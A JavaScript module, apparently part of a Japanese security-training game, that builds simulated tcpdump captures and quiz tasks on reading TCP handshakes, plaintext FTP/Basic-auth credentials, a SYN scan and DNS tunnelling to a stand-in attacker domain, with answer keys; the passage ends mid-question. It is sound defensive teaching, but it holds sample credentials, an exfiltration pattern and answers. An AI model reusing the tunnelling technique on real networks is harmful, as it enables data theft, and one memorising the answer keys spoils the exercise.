// パケット解析（tcpdump でキャプチャファイルを読む）
// キャプチャはすべてゲーム内の仮想データ。実在のネットワークからは一切取得しない。
import { mcq } from './_shared.js';

// ---- キャプチャ生成ヘルパー（tcpdump 出力形式のテキスト） ----
const line = (t, src, dst, detail, payload) =>
  `${t} IP ${src} > ${dst}: ${detail}` + (payload ? '\n' + payload.map(l => '\t' + l).join('\n') : '');
const stamp = (sec, us) => `10:${String(Math.floor(sec / 60)).padStart(2, '0')}:${String(sec % 60).padStart(2, '0')}.${String(us).padStart(6, '0')}`;

// 1) HTTP セッション（3ウェイハンドシェイク〜切断）＋無関係なDNS 2件
function webSession() {
  const C = '10.0.0.5.51234', S = '10.0.0.9.80';
  const P = [
    line(stamp(61, 100), C, S, 'Flags [S], seq 1000, win 64240, length 0'),
    line(stamp(61, 300), S, C, 'Flags [S.], seq 5000, ack 1001, win 65160, length 0'),
    line(stamp(61, 400), C, S, 'Flags [.], ack 5001, win 502, length 0'),
    line(stamp(61, 600), C, S, 'Flags [P.], seq 1001:1087, ack 5001, win 502, length 86', ['GET /index.html HTTP/1.1', 'Host: web.lab', 'User-Agent: curl/7.81.0']),
    line(stamp(61, 800), S, C, 'Flags [.], ack 1087, win 509, length 0'),
    line(stamp(62, 100), S, C, 'Flags [P.], seq 5001:5317, ack 1087, win 509, length 316', ['HTTP/1.1 200 OK', 'Server: nginx/1.22', 'Content-Type: text/html']),
    line(stamp(62, 200), C, S, 'Flags [.], ack 5317, win 501, length 0'),
    line(stamp(62, 900), C, S, 'Flags [F.], seq 1087, ack 5317, win 501, length 0'),
    line(stamp(62, 950), S, C, 'Flags [F.], seq 5317, ack 1088, win 509, length 0'),
    line(stamp(63, 10), C, S, 'Flags [.], ack 5318, win 501, length 0'),
  ];
  // 無関係なDNS（ポート80の絞り込みが意味を持つように混ぜる）
  P.splice(3, 0, line(stamp(61, 450), '10.0.0.5.53100', '10.0.0.2.53', '30211+ A? web.lab. (25)'));
  P.splice(5, 0, line(stamp(61, 700), '10.0.0.2.53', '10.0.0.5.53100', '30211 1/0/0 A 10.0.0.9 (41)'));
  return P.join('\n') + '\n';
}

// 2) 平文プロトコル: FTP ログインと HTTP Basic 認証
function ftpLogin() {
  const C = '10.0.0.5.40022', S = '10.0.0.20.21';
  return [
    line(stamp(10, 100), C, S, 'Flags [S], seq 200, win 64240, length 0'),
    line(stamp(10, 250), S, C, 'Flags [S.], seq 900, ack 201, win 65160, length 0'),
    line(stamp(10, 300), C, S, 'Flags [.], ack 901, win 502, length 0'),
    line(stamp(10, 500), S, C, 'Flags [P.], seq 901:925, ack 201, win 509, length 24', ['220 (vsFTPd 3.0.3)']),
    line(stamp(11, 100), C, S, 'Flags [P.], seq 201:213, ack 925, win 502, length 12', ['USER backup']),
    line(stamp(11, 300), S, C, 'Flags [P.], seq 925:959, ack 213, win 509, length 34', ['331 Please specify the password.']),
    line(stamp(12, 200), C, S, 'Flags [P.], seq 213:234, ack 959, win 502, length 21', ['PASS Spring#2024']),
    line(stamp(12, 450), S, C, 'Flags [P.], seq 959:982, ack 234, win 509, length 23', ['230 Login successful.']),
  ].join('\n') + '\n';
}
function httpBasic() {
  const C = '10.0.0.5.52000', S = '10.0.0.50.8080';
  return [
    line(stamp(20, 100), C, S, 'Flags [S], seq 300, win 64240, length 0'),
    line(stamp(20, 250), S, C, 'Flags [S.], seq 700, ack 301, win 65160, length 0'),
    line(stamp(20, 300), C, S, 'Flags [.], ack 701, win 502, length 0'),
    line(stamp(20, 500), C, S, 'Flags [P.], seq 301:420, ack 701, win 502, length 119', ['GET /admin HTTP/1.1', 'Host: intra.lab:8080', 'Authorization: Basic YWRtaW46U3VwZXJTZWNyZXQh', 'Accept: */*']),
    line(stamp(20, 900), S, C, 'Flags [P.], seq 701:760, ack 420, win 509, length 59', ['HTTP/1.1 200 OK', 'Content-Type: text/html']),
  ].join('\n') + '\n';
}

// 3) SYN スキャン
function synScan() {
  const A = '198.51.100.77.54321', V = '10.0.0.9';
  const ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 8080];
  const open = new Set([22, 80, 443]);
  const P = [];
  // 正規ユーザーの通信（通常のHTTP）
  P.push(line(stamp(30, 10), '10.0.0.5.51000', `${V}.80`, 'Flags [S], seq 10, win 64240, length 0'));
  P.push(line(stamp(30, 200), `${V}.80`, '10.0.0.5.51000', 'Flags [S.], seq 20, ack 11, win 65160, length 0'));
  P.push(line(stamp(30, 300), '10.0.0.5.51000', `${V}.80`, 'Flags [.], ack 21, win 502, length 0'));
  let us = 1000;
  for (const p of ports) {
    P.push(line(stamp(31, us), A, `${V}.${p}`, 'Flags [S], seq 4000, win 1024, length 0'));
    us += 120;
    if (open.has(p)) {
      P.push(line(stamp(31, us), `${V}.${p}`, A, 'Flags [S.], seq 7000, ack 4001, win 64240, length 0'));
      us += 60;
      P.push(line(stamp(31, us), A, `${V}.${p}`, 'Flags [R], seq 4001, win 0, length 0'));
    } else {
      P.push(line(stamp(31, us), `${V}.${p}`, A, 'Flags [R.], seq 0, ack 4001, win 0, length 0'));
    }
    us += 90;
  }
  return P.join('\n') + '\n';
}

// 4) DNS トンネリング
function dnsTunnel() {
  const Q = (sec, us, id, name) => line(stamp(sec, us), `10.0.0.5.${53000 + (id % 900)}`, '10.0.0.2.53', `${id}+ A? ${name} (${name.length + 5})`);
  const hexChunks = ['464c41477b64', '6e735f74756e', '6e656c5f6f6b', '7d'];
  const P = [
    Q(40, 100, 41001, 'www.acme.lab.'), Q(40, 900, 41002, 'mail.acme.lab.'),
    Q(41, 300, 41003, 'www.acme.lab.'), Q(42, 100, 41004, 'update.acme.lab.'),
    Q(42, 700, 41005, 'www.acme.lab.'),
  ];
  hexChunks.forEach((h, i) => P.splice(2 + i, 0, Q(41, 100 * (i + 1), 41100 + i, `${h}.t.evil-dns.example.`)));
  P.push(Q(43, 200, 41006, 'mail.acme.lab.'));
  return P.join('\n') + '\n';
}

const review = (steps, commands, why, practice, related) => ({ steps, commands, why, practice, related });

export const stagePacket = {
  id: 'packet',
  title: 'Packet — パケットを読む',
  subtitle: 'tcpdump でキャプチャを解析し、通信の中身から事実を読み取る',
  intro: 'ログに残らないものでも、通信そのものには証拠が残る。パケットキャプチャ(pcap)を tcpdump で読み、ハンドシェイク・平文の認証情報・スキャン・DNSの悪用を見抜く。キャプチャはすべて訓練用の仮想データだ。',
  missions: [
    {
      id: 'pk-01-handshake',
      title: 'TCP通信をパケットで読む',
      minutes: 12,
      objectives: ['tcpdump でキャプチャファイルを読む', 'フィルタで通信を絞り込む', '3ウェイハンドシェイクをフラグから読み解く'],
      prereq: ['nb-06-ports'],
      briefing: 'Webサーバー web.lab への通信を記録したキャプチャ web-session.pcap がある。1回のHTTPアクセスで、実際にどんなパケットが何個やり取りされたのか。理論で学んだTCPの仕組みを、実物のパケットで確かめる。',
      concepts: [{
        title: 'tcpdump とパケットの読み方',
        why: 'ログはアプリが「書いた」記録だが、パケットは実際に「流れた」事実そのもの。改ざんされにくく、アプリのログに出ない攻撃の痕跡も残る。',
        problem: '1回のWebアクセスの裏で、どんな通信が起きているかを自分の目で確認したい。',
        how: 'tcpdump -nr ファイル でキャプチャを読む(-n は名前解決しない、-r は読み込み)。フィルタは tcpdump -nr ファイル \'port 80\' や \'src host 10.0.0.5\' のように書く。TCPフラグは [S]=SYN, [S.]=SYN+ACK, [.]=ACK, [P.]=データ送信(PSH+ACK), [F.]=FIN(切断), [R]=RST(拒否/リセット)。-A を付けるとペイロード(通信の中身)も表示される。',
        example: '$ tcpdump -nr web-session.pcap \'dst port 80\' 2>/dev/null\n… Flags [S], seq 1000 …',
        relation: 'キャプチャを読み、フィルタで絞り、ハンドシェイクと中身を確認する。',
      }],
      env: {
        hostname: 'soc', user: 'analyst', dirs: ['/home/analyst/pcap'],
        files: [{ path: '/home/analyst/pcap/web-session.pcap', owner: 'analyst', content: webSession() }],
      },
      quick: ['cd /home/analyst/pcap', 'tcpdump -nr web-session.pcap 2>/dev/null', 'tcpdump -nr web-session.pcap \'dst port 80\' 2>/dev/null', 'tcpdump -nAr web-session.pcap \'port 80\' 2>/dev/null', 'tcpdump -nr web-session.pcap \'tcp and src host 10.0.0.9\' 2>/dev/null'],
      tasks: [
        {
          q: 'web-session.pcap には全部で何個のパケットが記録されていますか。tcpdump の出力行数を数えてください。',
          narration: 'tcpdump は読み込み中のメッセージを標準エラー出力に出す。数えるときは 2>/dev/null で捨ててから wc -l に渡すと、パケット行だけを数えられる。',
          check: { type: 'answer', any: ['12'] },
          answerHint: '個数',
          hints: ['tcpdump -nr web-session.pcap を実行', 'パイプで wc -l。標準エラーは 2>/dev/null で捨てる', 'tcpdump -nr web-session.pcap 2>/dev/null | wc -l'],
          explain: 'キャプチャは12パケット(HTTPセッション10 + 無関係なDNS 2)。tcpdump の「reading from file …」は標準エラー出力なので、数えるときは 2>/dev/null で除いておく。パイプと標準エラーの分離(Shellステージ)がここで実際に役立つ。',
        },
        {
          q: 'クライアント(10.0.0.5)からWebサーバーのポート80へ向かうパケット(宛先ポートが80)は何個ありますか。フィルタ \'dst port 80\' を使ってください。',
          narration: 'フィルタは引用符で囲んで tcpdump に渡す。dst port 80 は「宛先ポートが80」。DNSなど無関係な通信が除かれて、Webへ向かう通信だけが残る。',
          check: { type: 'answer', any: ['6'] },
          hints: ['tcpdump -nr web-session.pcap \'dst port 80\'', '| wc -l で数える(2>/dev/null を忘れずに)', 'SYN・ACK・データ・ACK・FIN・ACK の6個'],
          explain: 'クライアント→サーバー方向のパケットは6個(SYN, ACK, GET, ACK, FIN, ACK)。BPFフィルタ(dst port / src host / and / or / not)で必要な通信だけに絞り込めるので、大量のキャプチャでも目的の通信を素早く抽出できる。',
        },
        {
          q: 'サーバーが返す最初のパケットのフラグは [S.] です。これは SYN と、もう一つ別のフラグの組み合わせです。そのフラグ名(英大文字3文字)を答えてください。',
          narration: 'TCP接続は3ウェイハンドシェイクで確立される。クライアントがSYN、サーバーがSYN+ACK、クライアントがACK。tcpdump の表記では ACK を「.」で表す。',
          check: { type: 'answer', any: ['ACK'], ci: true },
          answerHint: '英大文字3文字',
          hints: ['フラグ表記: [S]=SYN, [.]=ACK', '[S.] は S と . の組み合わせ', 'SYN+ACK(サーバーが「受け付けた、こちらも接続する」と返す)'],
          explain: '[S.] = SYN+ACK。3ウェイハンドシェイクは ①クライアント SYN → ②サーバー SYN+ACK → ③クライアント ACK。この3パケットが揃って初めて接続が確立する。ポートスキャンでは、この途中で止めたり(SYNだけ送る)する特徴が現れる(後のミッションで見る)。',
        },
        {
          q: 'クライアントがリクエストしたURLのパス(GET の後ろ)を、パケットの中身から読み取って答えてください。ペイロードを表示するには -A を使います。',
          narration: 'HTTP は平文なので、-A で通信の中身が読める。GET行にリクエスト先が書かれている。',
          check: { type: 'answer', any: ['/index.html'] },
          answerHint: '/ から始まるパス',
          hints: ['tcpdump に -A を付けるとペイロードが見える(-nAr のようにまとめて書ける)', 'tcpdump -nAr web-session.pcap \'port 80\' 2>/dev/null', 'GET /index.html HTTP/1.1'],
          explain: 'HTTP(暗号化なし)は、リクエストもレスポンスも通信路上で丸見えになる。GETのパス、Hostヘッダ、User-Agent、レスポンスのサーバー名まで読み取れた。だから通信の暗号化(HTTPS/TLS)が重要になる——次のミッションで、平文の危険を具体的に見る。',
        },
      ],
      review: review(
        ['tcpdump -nr でキャプチャを読む(読み込みメッセージは 2>/dev/null)', 'BPFフィルタで通信を絞る', 'フラグ表記から3ウェイハンドシェイクを確認', '-A でペイロード(平文の中身)を読む'],
        [{ cmd: 'tcpdump -nr web-session.pcap 2>/dev/null | wc -l', meaning: 'パケット数を数える' }, { cmd: "tcpdump -nr web-session.pcap 'dst port 80'", meaning: '宛先ポート80だけに絞る' }, { cmd: "tcpdump -nAr web-session.pcap 'port 80'", meaning: '中身(ペイロード)も表示' }],
        'パケットは「実際に流れた事実」で、アプリのログより改ざんされにくい。通信を読めれば、ログに残らない攻撃や不審な挙動も確認できる。',
        'インシデント時のpcap解析、ネットワーク障害の切り分け(SYNに返事が無い等)、Wiresharkでの詳細解析の前段としての絞り込み。',
        ['3ウェイハンドシェイク', 'Wireshark', '平文プロトコルの危険']),
      learned: ['tcpdump', 'pcap', 'tcp-flags', 'bpf-filter', 'packet-analysis'],
      solution: ['cd /home/analyst/pcap', 'tcpdump -nr web-session.pcap 2>/dev/null | wc -l', "tcpdump -nr web-session.pcap 'dst port 80' 2>/dev/null | wc -l", "tcpdump -nAr web-session.pcap 'port 80' 2>/dev/null"],
    },

    {
      id: 'pk-02-cleartext',
      title: '平文通信から認証情報を読む',
      minutes: 13,
      objectives: ['平文プロトコルの危険を実物のパケットで確認する', 'Base64 のHTTP Basic認証を復号する', '暗号化された代替手段を選ぶ'],
      prereq: ['pk-01-handshake', 'c-01-base64'],
      briefing: '社内のスイッチで取得した通信に、FTPのログインとHTTP Basic認証が含まれている。通信路上の誰かが同じものを見ていたら、何が盗まれるのか。攻撃者の視点で確かめ、防御策につなげる。',
      concepts: [{
        title: '平文プロトコルと盗聴',
        why: 'FTP・Telnet・HTTP(暗号化なし)は、認証情報を含めてすべて平文で流れる。同じネットワークにいる者が通信を覗けば、パスワードがそのまま見える。',
        problem: 'ネットワーク上のパケットから、ユーザー名・パスワードを取り出せてしまう。これが「盗聴」で、暗号化しない通信の根本的な弱点だ。',
        how: 'FTPは USER/PASS コマンドをそのまま送る。HTTP Basic認証は「ユーザー名:パスワード」を Base64 でエンコードして Authorization ヘッダに載せるだけで、暗号化ではない(base64 -d で誰でも復号できる)。対策は、通信そのものをTLSやSSHで暗号化すること(SFTP・FTPS・HTTPS)。',
        example: 'Authorization: Basic YWRtaW46… → echo YWRtaW46… | base64 -d → admin:…',
        relation: 'キャプチャからFTPの資格情報とBasic認証を取り出し、暗号化の必要性を実感する。',
      }],
      env: {
        hostname: 'soc', user: 'analyst', dirs: ['/home/analyst/pcap'],
        files: [
          { path: '/home/analyst/pcap/ftp-login.pcap', owner: 'analyst', content: ftpLogin() },
          { path: '/home/analyst/pcap/http-basic.pcap', owner: 'analyst', content: httpBasic() },
        ],
      },
      quick: ['cd /home/analyst/pcap', "tcpdump -nAr ftp-login.pcap 'port 21' 2>/dev/null", "tcpdump -nAr ftp-login.pcap 2>/dev/null | grep -E 'USER|PASS'", 'tcpdump -nAr http-basic.pcap 2>/dev/null | grep Authorization', 'echo YWRtaW46U3VwZXJTZWNyZXQh | base64 -d'],
      tasks: [
        {
          q: 'ftp-login.pcap から、FTPログインに使われたユーザー名を読み取ってください。',
          narration: 'FTPの制御通信(ポート21)は平文。-A でペイロードを表示し、USER コマンドを探す。',
          check: { type: 'answer', any: ['backup'], ci: true },
          answerHint: 'ユーザー名',
          hints: ['tcpdump -nAr ftp-login.pcap 2>/dev/null でペイロード付きで表示', 'grep USER で絞ると速い', 'USER backup'],
          explain: 'ユーザー名 backup が通信から丸見え。FTPはコマンドもデータも暗号化しないため、同一ネットワーク上で通信を取得できる者(悪意ある端末・侵害されたスイッチ・不正なWi-Fiアクセスポイント等)に、認証情報が見えてしまう。',
        },
        {
          q: '同じFTPセッションのパスワードも平文で流れています。PASS コマンドの引数(パスワード)を答えてください。',
          narration: 'USER の次に PASS が送られる。同じキャプチャのペイロードを探す。',
          check: { type: 'answer', any: ['Spring#2024'] },
          answerHint: 'パスワード',
          hints: ['grep -E \'USER|PASS\' で認証コマンドだけを抜き出す', 'tcpdump -nAr ftp-login.pcap 2>/dev/null | grep PASS', 'PASS Spring#2024'],
          explain: 'パスワード Spring#2024 が平文で取得できた。本物の攻撃者はこの情報でそのままFTPにログインできる。しかもこの手のパスワードは他のサービスでも使い回されがちなので、被害は1つのサーバーに留まらない可能性がある。',
        },
        {
          q: 'http-basic.pcap の Authorization ヘッダには Base64 の文字列があります。それを復号し、含まれていたパスワード(コロンの後ろ)を答えてください。',
          narration: 'HTTP Basic認証は「ユーザー名:パスワード」を Base64 でエンコードしただけ。暗号化ではないので、base64 -d で戻せる。cut -d: -f2 でコロンの後ろだけ取り出せる。',
          check: { type: 'answer', any: ['SuperSecret!'] },
          answerHint: 'パスワード',
          hints: ['tcpdump -nAr http-basic.pcap 2>/dev/null | grep Authorization で文字列を探す', 'Basic の後ろを echo して base64 -d にパイプ', 'echo YWRtaW46U3VwZXJTZWNyZXQh | base64 -d → admin:SuperSecret!'],
          explain: 'admin:SuperSecret! と復号できた。HTTP Basic認証は「Base64」であって暗号化ではないため、HTTPSで包まなければ平文と同じ。Cryptoステージで学んだ「エンコードと暗号化の違い」が、実際の認証情報の漏洩として現れた例。',
        },
        mcq('これらの平文通信による認証情報漏洩への対策として、最も適切なものはどれか。',
          ['パスワードをもっと長く複雑にする', 'FTPをSFTP/FTPS、HTTPをHTTPSに置き換え通信を暗号化する', 'サーバーのポート番号を標準から変更する', 'ファイアウォールでICMPを遮断する'], 2,
          '正解は2。根本原因は「通信が暗号化されていないこと」なので、SFTP(SSH上)・FTPS(TLS)・HTTPSで通信路を暗号化するのが本質的な対策。パスワードを複雑にしても平文で流れれば丸見え(1)、ポート変更は発見を少し遅らせるだけ(3)、ICMP遮断は無関係(4)。',
          { narration: '何が問題の根本かを考える。' }),
      ],
      review: review(
        ['tcpdump -A で平文のペイロードを表示', 'grep で USER/PASS/Authorization を抽出', 'Base64 を base64 -d で復号', '通信の暗号化(SFTP/HTTPS)に置き換える'],
        [{ cmd: "tcpdump -nAr ftp-login.pcap 2>/dev/null | grep -E 'USER|PASS'", meaning: 'FTPの認証情報を抜き出す' }, { cmd: 'echo YWRtaW46… | base64 -d', meaning: 'Basic認証を復号' }],
        '平文プロトコルの危険は理論だけでなく「実際に読める」事実として理解する。暗号化の必要性を説明できる根拠になる。',
        'ペネトレーションテストでの盗聴リスク評価、レガシープロトコル(Telnet/FTP/HTTP)の棚卸しと暗号化プロトコルへの移行。',
        ['TLS', 'HTTPS', 'SFTP', 'Cryptoステージ(base64)']),
      learned: ['cleartext-protocols', 'sniffing', 'http-basic-auth', 'ftp-credentials', 'encryption-in-transit'],
      solution: ['cd /home/analyst/pcap', "tcpdump -nAr ftp-login.pcap 2>/dev/null | grep -E 'USER|PASS'", 'tcpdump -nAr http-basic.pcap 2>/dev/null | grep Authorization', 'echo YWRtaW46U3VwZXJTZWNyZXQh | base64 -d'],
    },

    {
      id: 'pk-03-synscan',
      title: 'ポートスキャンをパケットから見抜く',
      minutes: 14,
      objectives: ['SYNスキャンの特徴をパケットで確認する', 'tcpdump と awk/sort/uniq で攻撃元を特定する', '開いているポートを応答から判定する'],
      prereq: ['pk-01-handshake', 'n-02-portscan'],
      briefing: 'IDS(侵入検知)が web サーバー 10.0.0.9 へのスキャンを疑った。nmap のようなスキャンは、1つの攻撃元から短時間に多数のポートへパケットを送るという、はっきりした形でキャプチャに残る。',
      concepts: [{
        title: 'SYNスキャンのパケットパターン',
        why: 'nmap の既定のスキャン(SYNスキャン)は、接続を最後まで完了させず、SYNに対する応答だけで各ポートの開閉を判定する。ログには残りにくいが、パケットには特徴が出る。',
        problem: '大量のパケットから、スキャンしている攻撃元と、その結果(どのポートが開いていたか)を読み取りたい。',
        how: '攻撃元は1つのIPから多数の異なる宛先ポートへ SYN を送る。サーバーの応答は、開いているポートなら SYN+ACK([S.])、閉じているポートなら RST([R.])。攻撃者は開いていたポートに RST を返して接続を完了させない。集計は tcpdump の出力を awk で必要な列にし、cut/sort/uniq -c で数える。',
        example: 'SYN → SYN+ACK(開) / SYN → RST+ACK(閉)',
        relation: 'スキャン元・探索ポート数・開いていたポートを、パケットから集計して割り出す。',
      }],
      env: {
        hostname: 'soc', user: 'analyst', dirs: ['/home/analyst/pcap'],
        files: [{ path: '/home/analyst/pcap/scan.pcap', owner: 'analyst', content: synScan() }],
      },
      quick: ['cd /home/analyst/pcap', 'tcpdump -nr scan.pcap 2>/dev/null | head -8', "tcpdump -nr scan.pcap 2>/dev/null | grep 'Flags \\[S\\],'", "tcpdump -nr scan.pcap 'src host 198.51.100.77' 2>/dev/null | awk '{print $5}' | sort -u | wc -l", "tcpdump -nr scan.pcap 2>/dev/null | grep 'Flags \\[S\\.\\]'"],
      tasks: [
        {
          q: 'SYN だけを送っているパケット(Flags [S],)の送信元IPアドレスを集計し、最も多くSYNを送っているIPを答えてください。送信元は「IP.ポート」の形なので、ポートを除いたIPで数えます。',
          narration: 'tcpdump の出力は空白区切り。3列目が送信元(IP.ポート)。cut -d. -f1-4 で最初の4つのピリオド区切り(=IP部分)だけを取り出して、sort | uniq -c で数える。',
          check: { type: 'answer', any: ['198.51.100.77'], normalizeIp: true },
          answerHint: '最多のIP',
          hints: ["tcpdump -nr scan.pcap 2>/dev/null | grep 'Flags \\[S\\],' で SYN だけにする", "awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn", '198.51.100.77 が12個、正規ユーザー 10.0.0.5 は1個'],
          explain: '198.51.100.77 が12個のSYNを送っており、正規ユーザー(10.0.0.5)の1個と比べて突出している。1つのIPから短時間に大量のSYN——これがスキャンの典型的な形。grep(絞る)→awk(列を取る)→cut(IPだけ)→sort|uniq -c(数える) という、ログ集計でおなじみの型がパケット解析でもそのまま使える。',
        },
        {
          q: 'このスキャン元(198.51.100.77)は、10.0.0.9 の異なる宛先ポートを全部でいくつ探っていますか。送信元がそのIPのパケットに絞り、宛先ポートの種類を数えてください。',
          narration: 'フィルタ \'src host 198.51.100.77\' で攻撃元のパケットだけに絞る。5列目が宛先(IP.ポート:)。sort -u で重複を除いて数える。',
          check: { type: 'answer', any: ['12'] },
          hints: ["tcpdump -nr scan.pcap 'src host 198.51.100.77' 2>/dev/null", "awk '{print $5}' で宛先列を取り出し、sort -u で重複を除く", '| wc -l で数える。12種類のポート'],
          explain: '12種類のポート(21,22,23,25,53,80,110,139,443,445,3306,8080)を短時間に探っている。人間が普通に使う通信では、同じ相手の何十種類ものポートに立て続けに接続することはない。「多数のポートへの試行」「1つの攻撃元」「短時間」の3点が、スキャン検知の基本条件になる。',
        },
        {
          q: 'サーバー 10.0.0.9 がスキャン元に対して SYN+ACK([S.])を返したポート、つまり「開いている」と判定されたポートは全部でいくつありますか。',
          narration: '開いているポートは SYN+ACK で応答し、閉じているポートは RST で応答する。サーバーからスキャン元への応答で [S.] のものを数える。',
          check: { type: 'answer', any: ['3'] },
          hints: ["tcpdump -nr scan.pcap 'src host 10.0.0.9 and dst host 198.51.100.77' 2>/dev/null", "grep -c 'Flags \\[S\\.\\]' で SYN+ACK の数を数える", '22・80・443 の3ポートが開いていた'],
          explain: '開いていたのは 22(SSH)・80(HTTP)・443(HTTPS) の3ポート。攻撃者はこの結果から、SSH総当たりやWebの脆弱性探索といった次の手を選ぶ。防御側は、不要なポートを閉じて攻撃面を減らし、スキャンを検知したら送信元を遮断する。パケットから「何が見つかってしまったか」まで割り出せた。',
        },
        mcq('SYNスキャンを検知するための特徴として、最も適切なものはどれか。',
          ['1つの送信元が短時間に多数の異なる宛先ポートへSYNを送る', '同じポートに大量のHTTPリクエストが来る', 'パケットサイズが常に最大である', 'DNSの応答が遅い'], 1,
          '正解は1。スキャンは「1つの送信元IP × 短時間 × 多数の異なる宛先ポート」が特徴。2はHTTPフラッド、3・4はスキャンとは無関係。IDS(Suricata/Snort)も同様の条件(閾値)でスキャンを検知する。検知後は送信元の遮断と、公開ポートの見直しを行う。',
          { narration: 'スキャンの本質は「手当たり次第にポートを試す」こと。' }),
      ],
      review: review(
        ['tcpdump + grep でSYNだけを抽出', 'awk/cut/sort/uniq -c で送信元を集計', '宛先ポートの種類数を数える', '[S.](開)と[R.](閉)で結果を読む'],
        [{ cmd: "tcpdump -nr scan.pcap 2>/dev/null | grep 'Flags \\[S\\],' | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn", meaning: 'SYN送信元のランキング' }, { cmd: "tcpdump -nr scan.pcap 'src host 198.51.100.77' | awk '{print $5}' | sort -u | wc -l", meaning: '探索したポート数' }],
        'スキャン検知は偵察段階を見つける重要な手がかり。送信元・探索範囲・発見されたサービスを割り出すと、次に狙われる場所の予測と対策ができる。',
        'IDS/IPSのスキャン検知ルール、ファイアウォールでの送信元遮断、不要ポートの閉鎖、定期的な自己スキャンによる攻撃面の確認。',
        ['nmap', 'IDS/IPS', 'ファイアウォール', '攻撃面の削減']),
      learned: ['syn-scan-detection', 'port-scan-analysis', 'syn-ack-rst', 'packet-aggregation'],
      solution: ['cd /home/analyst/pcap', "tcpdump -nr scan.pcap 2>/dev/null | grep 'Flags \\[S\\],' | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn", "tcpdump -nr scan.pcap 'src host 198.51.100.77' 2>/dev/null | awk '{print $5}' | sort -u | wc -l", "tcpdump -nr scan.pcap 'src host 10.0.0.9 and dst host 198.51.100.77' 2>/dev/null | grep -c 'Flags \\[S\\.\\]'"],
    },

    {
      id: 'pk-04-dns-tunnel',
      title: 'DNSトンネリングによる持ち出しを見抜く',
      minutes: 15,
      objectives: ['DNS通信の異常を見つける', 'サブドメインに埋め込まれたデータを復元する', 'DNSを悪用した持ち出しの検知方法を理解する'],
      prereq: ['pk-03-synscan', 'nb-04-dns'],
      briefing: '社内のPCから、ファイアウォールで許可されているDNSを使って、データが外部に持ち出されている疑いがある。DNSは「名前を引くだけ」の通信と思われがちだが、問い合わせ名の中にデータを詰めれば、外部の攻撃者サーバーへ情報を送れてしまう。',
      concepts: [{
        title: 'DNSトンネリング',
        why: 'DNSはほぼ必ず許可される通信で、中身が細かく監視されないことが多い。そのため、攻撃者は「問い合わせるドメイン名」にデータを埋め込んで外へ送る(トンネリング)。',
        problem: '通常のDNSクエリに紛れた、データ持ち出し用のクエリを見つけ、何が送られたのかを復元したい。',
        how: '通常のクエリは www.acme.lab のような短く読める名前。トンネリングは「ランダムな長い文字列.攻撃者のドメイン」を大量に引く。その長い部分(ラベル)がデータの断片で、16進やBase32で符号化されている。tcpdump で名前だけ取り出し、先頭ラベルをつなげて xxd -r -p で復元すれば、送られた中身が分かる。',
        example: '464c41477b64.t.evil-dns.example. → 先頭ラベル 464c41477b64 は16進(FLAG{d…)',
        relation: 'DNSクエリから異常なドメインを特定し、埋め込まれたデータを復元する。',
      }],
      env: {
        hostname: 'soc', user: 'analyst', dirs: ['/home/analyst/pcap'],
        files: [{ path: '/home/analyst/pcap/dns.pcap', owner: 'analyst', content: dnsTunnel() }],
      },
      quick: ['cd /home/analyst/pcap', 'tcpdump -nr dns.pcap 2>/dev/null', "tcpdump -nr dns.pcap 2>/dev/null | awk '{print $8}'", "tcpdump -nr dns.pcap 2>/dev/null | awk '{print $8}' | sort | uniq -c | sort -rn", "tcpdump -nr dns.pcap 2>/dev/null | grep evil-dns | awk '{print $8}' | cut -d. -f1"],
      tasks: [
        {
          q: 'dns.pcap のDNSクエリ(問い合わせ名は8列目)を一覧すると、通常の acme.lab 宛てに混じって、異常に長い16進の文字列を先頭に持つ名前があります。それを問い合わせている、攻撃者のドメイン名(末尾のドット無し、サブドメイン t を除く)を答えてください。',
          narration: 'awk \'{print $8}\' で問い合わせ名の列だけを取り出して眺める。www.acme.lab のような短く読める名前の中に、見慣れない長い文字列がある。',
          check: { type: 'answer', any: ['evil-dns.example', 'evil-dns.example.', 't.evil-dns.example', 't.evil-dns.example.'], ci: true },
          answerHint: 'ドメイン名',
          hints: ["tcpdump -nr dns.pcap 2>/dev/null | awk '{print $8}'", '名前の末尾(右側)を見る。acme.lab 以外のドメイン', 'evil-dns.example(長い16進ラベル.t.evil-dns.example.)'],
          explain: '長い16進ラベル付きの名前は evil-dns.example 宛て。正規の問い合わせ(www/mail/update.acme.lab)は短く読める名前なのに対し、これは人間が使わない不自然な長いランダム文字列。「異常に長い・ランダムなサブドメイン」はDNSトンネリングの最も分かりやすい兆候。',
        },
        {
          q: 'その攻撃者ドメイン(evil-dns.example)へのクエリは全部で何件ありますか。',
          narration: 'grep で evil-dns を含む行に絞って数える。1回の通信量は小さいので、データを送るには何度も分けて問い合わせる必要がある。',
          check: { type: 'answer', any: ['4'] },
          hints: ["tcpdump -nr dns.pcap 2>/dev/null | grep -c evil-dns", "または grep evil-dns | wc -l", '4件(データを4つに分割して送っている)'],
          explain: '4件のクエリ。DNS名には長さの上限(1ラベル63文字)があるため、データは小さく分割して何度にも分けて送られる。同じドメインに対する短時間の連続した問い合わせは、トンネリングの2つ目の兆候。実際の攻撃では数百〜数千件になることもある。',
        },
        {
          q: '4件のクエリの先頭ラベル(16進の文字列)を送信された順につなげ、xxd -r -p で復元して、埋め込まれていたデータ FLAG{...} の中身を答えてください。',
          narration: 'grep → awk(名前の列)→ cut -d. -f1(先頭ラベル)→ tr -d \'\\n\'(改行を消して1本につなぐ)→ xxd -r -p(16進を文字に戻す)。パイプでつなげて一気に処理する。',
          check: { type: 'answer', any: ['dns_tunnel_ok'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ["grep evil-dns で攻撃者宛てだけにし、awk '{print $8}' | cut -d. -f1 で先頭ラベルを取り出す", "tr -d '\\n' で改行を消して1行につなぐ", "tcpdump -nr dns.pcap 2>/dev/null | grep evil-dns | awk '{print $8}' | cut -d. -f1 | tr -d '\\n' | xxd -r -p"],
          explain: '先頭ラベルをつなげた 464c41477b646e735f74756e6e656c5f6f6b7d を xxd -r -p で復元すると FLAG{dns_tunnel_ok}。DNSの問い合わせ名に、持ち出したいデータが16進で埋め込まれていた。この一連の処理(grep→awk→cut→tr→xxd)は、これまでのステージで身につけたテキスト処理と符号化の知識の総合応用になっている。',
        },
        mcq('DNSトンネリングの検知に有効な指標として、適切でないものはどれか。',
